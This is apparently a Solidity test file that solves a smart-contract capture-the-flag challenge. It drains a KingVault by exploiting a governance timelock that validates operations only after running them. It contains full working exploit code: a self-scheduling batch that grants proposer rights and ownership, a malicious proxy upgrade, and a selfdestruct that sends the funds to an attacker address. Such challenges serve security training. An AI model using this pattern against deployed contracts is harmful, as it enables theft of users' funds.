// SPDX-License-Identifier: MIT
pragma solidity 0.8.4;

import "../contracts/Setup.sol";
import "../contracts/TheKingIsDeadLongLiveTheKing.sol";
import "forge-std/console.sol";

contract TheKingIsDeadLongLiveTheKingTest {
    Setup setup;
    KingVault kingVault;
    GovernanceTimelock governanceTimelock;
    address attackerAddr;

    function setUp() external {
        setup = new Setup{value: 0.2 ether}();
        kingVault = KingVault(address(setup.instance()));
        governanceTimelock = GovernanceTimelock(payable(kingVault.owner()));
        attackerAddr = address(bytes20(keccak256("ATTACKER")));
    }

    /**
    The GovernanceTimelock contract, which is the owner of the KingVault contract, does not commit `targets`, `values` and `dataElements` in `schedule()`, allowing arbitrary `execute()`, as long as it validates itself, since validation of the operation happens AFTER the operation is executed.

    In other words, an operation can validate itself.

    These are the attack steps:
    1. Become proposer in GovernanceTimelock - GovernanceTimelock.grantRole();
    2. Become admin of KingVault proxy - KingVault.transferOwnership();
    3. Validate 1 and 2 operation (now that I'm proposer) - GovernanceTimelock.schedule();
    4. Upgrade KingVault proxy to malicious implementation - KingVault.upgradeTo();
    5. Withdraw funds through call to malicious contract
     */
    function testAttack() external {
        /////////////
        // ATTACK ///
        /////////////
        console.log("ATTACKER BALANCE BEFORE: %s", attackerAddr.balance);

        // 1, 2, 3
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        bytes32 salt;

        (targets, values, dataElements, salt) = _getOperationParams();

        governanceTimelock.execute(targets, values, dataElements, salt);

        // 4, 5
        kingVault.upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("stealFunds(address)", attackerAddr)
        );

        // Check for attack success
        console.log("ATTACKER BALANCE AFTER: %s", attackerAddr.balance);
        require(setup.isSolved(), "NOT SOLVED");
    }

    /**
    @dev Callback from `execute()` in GovernanceTimelock
     */
    function validateOperation() external {
        address[] memory targets = new address[](3);
        uint256[] memory values = new uint256[](3);
        bytes[] memory dataElements = new bytes[](3);
        bytes32 salt;

        (targets, values, dataElements, salt) = _getOperationParams();

        governanceTimelock.schedule(targets, values, dataElements, salt);
    }

    /**
    @dev Callback (delegatecall) from `upgradeToAndCall()` in KingVault
     */
    function stealFunds(address _attackerAddr) external {
        selfdestruct(payable(_attackerAddr));
    }

    /**
    @dev Callback from `upgradeToAndCall()` to verify if this contract is capable of acting as a proxy
     */
    function proxiableUUID() external pure returns (bytes32) {
        return
            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    }

    /////////////
    // HELPERS //
    /////////////

    function _getOperationParams()
        internal
        view
        returns (
            address[] memory targets,
            uint256[] memory values,
            bytes[] memory dataElements,
            bytes32 salt
        )
    {
        targets = new address[](3);
        values = new uint256[](3);
        dataElements = new bytes[](3);
        salt = keccak256("");

        targets[0] = address(governanceTimelock);
        targets[1] = address(kingVault);
        targets[2] = address(this);
        dataElements[0] = abi.encodeWithSignature(
            "grantRole(bytes32,address)",
            governanceTimelock.PROPOSER_ROLE(),
            address(this)
        );
        dataElements[1] = abi.encodeWithSignature(
            "transferOwnership(address)",
            address(this)
        );
        dataElements[2] = abi.encodeWithSignature("validateOperation()");

        return (targets, values, dataElements, salt);
    }

    receive() external payable {}
}
